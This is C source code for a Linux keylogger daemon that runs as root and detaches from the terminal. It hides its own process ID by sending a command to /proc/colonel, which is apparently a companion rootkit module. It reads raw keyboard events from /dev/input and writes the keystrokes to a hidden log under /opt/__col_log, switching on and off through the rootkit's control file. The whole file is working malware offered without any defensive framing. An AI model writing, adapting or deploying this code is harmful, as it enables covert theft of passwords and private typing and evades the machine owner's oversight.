#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <time.h>
#include <fcntl.h>
#include <stdarg.h>

FILE *error_log;										/* error log */
FILE *evlog;	
char *evlog_path = "/opt/__col_log/evlog.txt"; 
char *control_path = "/proc/colonel";
char event_path[30] = {'\0'};

void daemonize(void) {
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();									/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork failure (%s)\n", strerror(errno));
		exit(1);
	}
	if (process_id > 0) {									/* exits the parent process */
		exit(0);
	}

	umask(0);										/* unmask the file mode */
	setup_dirs();
	setup_logs();
	sid = setsid();										/* set unique session for child process */
	if (sid < 0) {
		exit(1);
	}

	chdir("/opt/");										/* change daemon working directory */

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

}

int setup_dirs(void) {
    return mkdir("/opt/__col_log/", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);		/* log directory */
}

int setup_logs(void) {
	time_t curtime;
	time(&curtime);	
	
	error_log = fopen("/opt/__col_log/log.txt", "a+"); 					/* daemon log */
	if (NULL == error_log) {
                fprintf(error_log, "%sERROR: error_log couldn't be opened (%s)", ctime(&curtime), strerror(errno));
                exit(1);
        }	

        evlog = fopen(evlog_path, "a+");		 					/* key log */
	if (NULL == evlog) {
                fprintf(error_log, "%sERROR: Could not open '%s' (%s)", ctime(&curtime), evlog_path, strerror(errno));
                exit(1);
        }	
}

int hide_pid(void) {
	char dpid[10];								 	
	pid_t child_pid = getpid();								/* get keylogger pid */
	time_t curtime;
	time(&curtime);										/* set the current time */
	
       	int control_file = open(control_path, O_WRONLY);					/* open for write to hide keylogger pid */
	if (-1 == control_file) {
		fprintf(error_log, "%sERROR: '%s' not found (%s)", ctime(&curtime), control_path, strerror(errno));
		exit(1);
	}

	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			                	/* forms command */
	write(control_file, dpid, sizeof(dpid));			                	/* passes command to the colonel */
	fprintf(error_log, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));		/* records current pid to log */
	close(control_file);
	return 0;
}

int is_root(void) {
	time_t curtime;
	time(&curtime);										/* set the current time */
	if (geteuid() != 0) {									/* check if user is root */
		fprintf(error_log, "%sERROR: user not root (%s)", ctime(&curtime), strerror(errno));
		exit(1);
	}
	return 0;
}

int system_timestamp(void) {
	struct utsname unameData;								/* struct provides system information */
	uname(&unameData);									/* provides system information */
	time_t curtime;
	time(&curtime);										/* set the current time */
	evlog = fopen(evlog_path, "a+"); 							/* key log */
	if (NULL == evlog) {
		fprintf(error_log, "%sERROR: Could not open '%s' (%s)", ctime(&curtime), evlog_path, strerror(errno));
		exit(1);
	}	
	//fprintf(evlog, "%s%s | %s | %s\n\n-", ctime(&curtime), unameData.sysname, unameData.release, unameData.machine);
	fprintf(evlog, "\n\n%s-", ctime(&curtime));		       				/* timestamp */
	fclose(evlog);
	fprintf(error_log, "Begin listening -- %s", ctime(&curtime));
	return 0;
}
// dynamically finds event path. This has only been tested on my setup. More thorough testing is needed...
char *get_event_path(void){
        FILE *event_num;
        char data[2] = {'\0'};
        const char path[] = "/dev/input/event";
        int len;
	time_t curtime;
	time(&curtime);										/* set the current time */

												/* setup a pipe for reading and execute the command */
        event_num = popen("sudo /bin/grep 'sysrq kbd event' /proc/bus/input/devices | sudo /usr/bin/awk -F 'event' '{print $2}'","r");  
        if(!event_num){
                fprintf(error_log, "%sERROR: Could not open pipe for output (%s)", ctime(&curtime), strerror(errno));
                exit(1);
        }

        fgets(data, sizeof(data), event_num);							/* grab data from grep/awk execution */
        snprintf(event_path, sizeof(event_path), "%s%s", path, data);				/* merge path and data in single variable */

        if (pclose(event_num) != 0){
                fprintf(error_log,"%sERROR: Failed to close command stream (%s)", ctime(&curtime), strerror(errno));
                exit(1);
        }
        return event_path;
}

void key_listen(void) {
	int control_file;
	int input_device;									/* will read from device event file */
	char listening = 0;									/* toggles keylogger on/off */
	char *kl = "keylogger: 1";								/* defines what keylogger is listening for on /proc/colonel */
	struct input_event ev;									/* using input_event so we know what we're reading */
	time_t curtime;
	time(&curtime);										/* set the current time */
	
	input_device = open(event_path, O_RDONLY); 		    				/* key event file */
	if (-1 == input_device) {
		fprintf(error_log, "%sERROR: Could not open '%s' (%s)", ctime(&curtime), event_path, strerror(errno));
		exit(1);
	}
	
	while(1) {				
		fflush(error_log);
		ssize_t readreturn = read(input_device, &ev, sizeof(struct input_event));   	/* read from /dev/input/eventX */
		if (-1 == readreturn) {
			fprintf(error_log, "%sERROR: Could not read from '%s' (%s)", ctime(&curtime), event_path, strerror(errno));
			exit(1);
		}
		control_file = open(control_path, O_RDONLY);         				/* open /proc/colonel */
		if (-1 == control_file) {
			fprintf(error_log, "%sERROR: Could not open '%s' (%s)", ctime(&curtime), control_path, strerror(errno));
			exit(1);
		}
		char cmd[1024] = "";								/* stores commands */
		readreturn = read(control_file, cmd, sizeof(cmd) - 1);		        	/* read from /proc/colonel */
		if (-1 == readreturn) {
			fprintf(error_log, "%sERROR: Could not read from '%s' (control_file) (%s)", ctime(&curtime), control_path, strerror(errno));
			exit(1);
		}
                cmd[readreturn] = '\0';
		char *toggle = strstr(cmd, kl);			        			/* looks for change in /proc/colonel */
		if ((!listening) && (toggle != NULL)) {
			listening = !listening;
			system_timestamp();
			continue;

		} else if ((ev.type) && (listening)) {			                	/* if typing and keylogger is on */
        		evlog = fopen(evlog_path, "a+"); 					/* key log */
			if (NULL == evlog) {
                		fprintf(error_log, "%sERROR: Could not open '%s' (%s)", ctime(&curtime), evlog_path, strerror(errno));
                		exit(1);
            		}	
            		fprintf(evlog, "%i,%i-", ev.code, ev.value);     			/* grabs keyboard input */
			fflush(evlog);
			int control_file2 = open(control_path, O_RDONLY | O_NONBLOCK);
			if (-1 == control_file2) {
				fprintf(error_log, "%sERROR: Could not open '%s' (%s)", ctime(&curtime), control_path, strerror(errno));
				exit(1);
			}
			ssize_t readreturn2 = read(control_file2, cmd, sizeof(cmd) - 1);	/* read from /proc/colonel */
			if (-1 == readreturn2) {
				fprintf(error_log, "%sERROR: Could not read from '%s' (control_file2) (%s)", ctime(&curtime), control_path, strerror(errno));
				exit(1);
			}	
			if (NULL == toggle) {
				listening = !listening;
                		fclose(evlog);
				fprintf(error_log, "End listening -- %s", ctime(&curtime));
				continue;
			}
			close(control_file2);
                	fclose(evlog);
		}
		close(control_file);
	}
}


int main(void) {
	daemonize();
	hide_pid();
	is_root();
	get_event_path();
	key_listen();	

	fclose(evlog);
	fclose(error_log);
	return 0;
}
